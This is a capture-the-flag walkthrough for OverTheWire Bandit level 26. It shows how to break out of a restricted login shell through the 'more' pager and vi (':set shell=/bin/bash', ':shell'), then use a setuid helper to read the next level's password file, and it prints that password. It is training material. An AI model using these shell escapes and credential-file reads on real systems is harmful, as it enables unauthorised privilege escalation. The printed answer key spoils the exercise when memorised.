# Level 26

### Level Info

Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not **/bin/bash**, but something else. Find out what it is, how it works and how to break out of it.

> NOTE: if you’re a Windows user and typically use Powershell to `ssh` into bandit: Powershell is known to cause issues with the intended solution to this level. You should use command prompt instead.

### Commands you may need to solve this level

ssh, cat, more, vi, ls, id, pwd

# Solution

If we attempt to connect using the key, the following output appears:

```sh
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p 2220
.
.
.
  Enjoy your stay!

  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
Connection to localhost closed.
```

To understand what is happening, we can check the `/etc/passwd` file to see what `bandit26` executes when logging in:

```sh
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
andit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit25@bandit:~$ cat /home/bandit26/text.txt
cat: /home/bandit26/text.txt: Permission denied
```

The script executes **showtext**, which is a bash script that runs the **more** command on the `text.txt` file, to which we do not have access.

Since the **more** command is used, we can interact with its options before the connection closes. To achieve this, we need to ensure that not all content is displayed. How? By reducing the size of the terminal window.

```sh
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
:set shell=/bin/bash     
```

In **more** mode, pressing the **V** key allows us to enter visual mode. Using a colon (**:**), we can inject commands. For example, we can use the ***set*** command to define a variable, which in this case will be a bash shell.

We execute the variable, and:


```sh
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
:shell
bandit26@bandit:~$ 
```

We are now in a bash shell:

```sh
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ cat text.txt 
  _                     _ _ _   ___   __  
 | |                   | (_) | |__ \ / /  
 | |__   __ _ _ __   __| |_| |_   ) / /_  
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \ 
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ 
```

We can see that the text was the banner.  
Now, we have a binary called **bandit27-do**. Since we have previously worked with this binary, we can use it to gain access to `bandit27`.


```sh
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

# Password for level 27:

upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
